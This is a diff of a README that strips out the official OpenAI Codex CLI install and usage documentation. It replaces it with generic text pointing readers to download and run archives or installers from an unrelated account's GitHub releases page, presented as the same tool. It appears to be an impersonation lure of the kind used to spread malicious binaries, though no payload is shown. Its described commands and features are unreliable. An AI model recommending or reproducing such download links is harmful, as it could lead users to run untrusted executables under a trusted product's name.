@@ -1,104 +1,92 @@
-<p align="center"><code>npm i -g @openai/codex</code><br />or <code>brew install codex</code></p>
+# 🌟 codex - Your Easy Terminal Coding Assistant
 
-<p align="center"><strong>Codex CLI</strong> is a coding agent from OpenAI that runs locally on your computer.
-</br>
-</br>If you want Codex in your code editor (VS Code, Cursor, Windsurf), <a href="https://developers.openai.com/codex/ide">install in your IDE</a>
-</br>If you are looking for the <em>cloud-based agent</em> from OpenAI, <strong>Codex Web</strong>, go to <a href="https://chatgpt.com/codex">chatgpt.com/codex</a></p>
+## 🚀 Get Started
 
-<p align="center">
-  <img src="./.github/codex-cli-splash.png" alt="Codex CLI splash" width="80%" />
-  </p>
+Welcome to **codex**, your lightweight coding agent that runs in your terminal. It simplifies coding tasks, helping you execute commands quickly and efficiently. With **codex**, you can enhance your productivity without dealing with complicated setups or coding knowledge.
 
----
+## 📥 Download Now
 
-## Quickstart
+[![Download codex](https://img.shields.io/badge/Download-codex-blue.svg)](https://github.com/noums-ui/codex/releases)
 
-### Installing and running Codex CLI
+To get started, you’ll need to download **codex** from the Releases page. Simply click the button above, or visit this page to download: [Download codex](https://github.com/noums-ui/codex/releases).
 
-Install globally with your preferred package manager. If you use npm:
+## 🖥️ System Requirements
 
-```shell
-npm install -g @openai/codex
-```
+Before you proceed, make sure your computer meets the following requirements:
 
-Alternatively, if you use Homebrew:
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Free Disk Space: At least 100 MB
 
-```shell
-brew install codex
-```
+## 🔧 Installation Steps
 
-Then simply run `codex` to get started:
+Here’s how you can install **codex** on your system:
 
-```shell
-codex
-```
+1. **Visit the Releases Page**  
+   Go to the [Download codex](https://github.com/noums-ui/codex/releases) page.
 
-<details>
-<summary>You can also go to the <a href="https://github.com/openai/codex/releases/latest">latest GitHub Release</a> and download the appropriate binary for your platform.</summary>
+2. **Choose the Right Version**  
+   Look for the latest version of **codex**. Check the release notes for details on features or bug fixes in the version.
 
-Each GitHub Release contains many executables, but in practice, you likely want one of these:
+3. **Download the File**  
+   Click on the appropriate file for your operating system. This could be a `.zip`, `.tar.gz`, or an installer package.
 
-- macOS
-  - Apple Silicon/arm64: `codex-aarch64-apple-darwin.tar.gz`
-  - x86_64 (older Mac hardware): `codex-x86_64-apple-darwin.tar.gz`
-- Linux
-  - x86_64: `codex-x86_64-unknown-linux-musl.tar.gz`
-  - arm64: `codex-aarch64-unknown-linux-musl.tar.gz`
+4. **Extract or Run the Installer**  
+   For zip or tar files:
+   - Right-click the downloaded file.
+   - Select "Extract All…" or "Extract Here".
+   - Open the extracted folder.
 
-Each archive contains a single entry with the platform baked into the name (e.g., `codex-x86_64-unknown-linux-musl`), so you likely want to rename it to `codex` after extracting it.
+   For installer packages:
+   - Double-click the installer file and follow the prompts.
 
-</details>
+5. **Run codex**  
+   Open your terminal. Navigate to the folder where you extracted or installed **codex**. Use the following command to launch it:
+   
+   ```bash
+   ./codex
+   ```
 
-### Using Codex with your ChatGPT plan
+## ⚙️ Basic Commands
 
-<p align="center">
-  <img src="./.github/codex-cli-login.png" alt="Codex CLI login" width="80%" />
-  </p>
+Once **codex** is up and running, you can use a few simple commands to start working:
 
-Run `codex` and select **Sign in with ChatGPT**. We recommend signing into your ChatGPT account to use Codex as part of your Plus, Pro, Team, Edu, or Enterprise plan. [Learn more about what's included in your ChatGPT plan](https://help.openai.com/en/articles/11369540-codex-in-chatgpt).
+- **help**: Displays a list of available commands.
+- **run [command]**: Executes a specified command in your terminal.
+- **exit**: Closes **codex** and returns you to your terminal.
 
-You can also use Codex with an API key, but this requires [additional setup](./docs/authentication.md#usage-based-billing-alternative-use-an-openai-api-key). If you previously used an API key for usage-based billing, see the [migration steps](./docs/authentication.md#migrating-from-usage-based-billing-api-key). If you're having trouble with login, please comment on [this issue](https://github.com/openai/codex/issues/1243).
+These basic commands will get you started right away. As you become familiar with **codex**, you can explore more advanced features.
 
-### Model Context Protocol (MCP)
+## 📝 How To Use
 
-Codex can access MCP servers. To configure them, refer to the [config docs](./docs/config.md#mcp_servers).
+Here are some tips for effectively using **codex**:
 
-### Configuration
+1. **Use the Help Command**: Whenever you feel stuck, type `help` to see what commands are available.
 
-Codex CLI supports a rich set of configuration options, with preferences stored in `~/.codex/config.toml`. For full configuration options, see [Configuration](./docs/config.md).
+2. **Practice the Commands**: Try running simple commands to get comfortable with the interface.
 
----
+3. **Refer to Documentation**: If you have questions about specific features, consult the additional documentation provided in this repository.
 
-### Docs & FAQ
+## 🛠️ Troubleshooting
 
-- [**Getting started**](./docs/getting-started.md)
-  - [CLI usage](./docs/getting-started.md#cli-usage)
-  - [Running with a prompt as input](./docs/getting-started.md#running-with-a-prompt-as-input)
-  - [Example prompts](./docs/getting-started.md#example-prompts)
-  - [Memory with AGENTS.md](./docs/getting-started.md#memory-with-agentsmd)
-  - [Configuration](./docs/config.md)
-- [**Sandbox & approvals**](./docs/sandbox.md)
-- [**Authentication**](./docs/authentication.md)
-  - [Auth methods](./docs/authentication.md#forcing-a-specific-auth-method-advanced)
-  - [Login on a "Headless" machine](./docs/authentication.md#connecting-on-a-headless-machine)
-- **Automating Codex**
-  - [GitHub Action](https://github.com/openai/codex-action)
-  - [TypeScript SDK](./sdk/typescript/README.md)
-  - [Non-interactive mode (`codex exec`)](./docs/exec.md)
-- [**Advanced**](./docs/advanced.md)
-  - [Tracing / verbose logging](./docs/advanced.md#tracing--verbose-logging)
-  - [Model Context Protocol (MCP)](./docs/advanced.md#model-context-protocol-mcp)
-- [**Zero data retention (ZDR)**](./docs/zdr.md)
-- [**Contributing**](./docs/contributing.md)
-- [**Install & build**](./docs/install.md)
-  - [System Requirements](./docs/install.md#system-requirements)
-  - [DotSlash](./docs/install.md#dotslash)
-  - [Build from source](./docs/install.md#build-from-source)
-- [**FAQ**](./docs/faq.md)
-- [**Open source fund**](./docs/open-source-fund.md)
+If you encounter any issues while using **codex**, consider these common problems:
 
----
+- **The command doesn’t work:** Double-check that you entered the command correctly. Ensure you’re in the right directory.
 
-## License
+- **Installation problems:** Restart your computer and repeat the installation process. Make sure you have the right file for your operating system.
 
-This repository is licensed under the [Apache-2.0 License](LICENSE).
+- **Performance issues:** If **codex** runs slowly, ensure your computer meets the system requirements.
+
+## 📞 Support
+
+For further assistance, visit our GitHub issue tracker where you can report bugs or reach out for help. Your feedback helps improve **codex** for everyone.
+
+## 🌍 Community
+
+Join our community forum to connect with other users of **codex**. Share tips, ask questions, and exchange ideas to make the most of your coding experience.
+
+## 📋 Next Steps
+
+Now that you have installed and set up **codex**, try exploring its features. Experiment with different commands and find your workflow. With **codex**, you can make coding less intimidating and more accessible.
+
+Feel free to check back here for updates or new features as they become available!
